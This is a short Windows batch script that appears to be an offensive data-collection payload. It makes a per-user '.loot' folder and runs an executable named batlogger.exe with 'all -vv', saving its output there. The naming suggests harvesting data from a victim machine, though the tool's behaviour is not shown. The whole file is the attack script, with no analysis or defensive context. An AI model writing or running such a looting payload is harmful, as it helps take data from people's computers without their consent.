@echo off
md .loot\%username%
batlogger.exe all -vv >>".loot\%username%\logs.txt"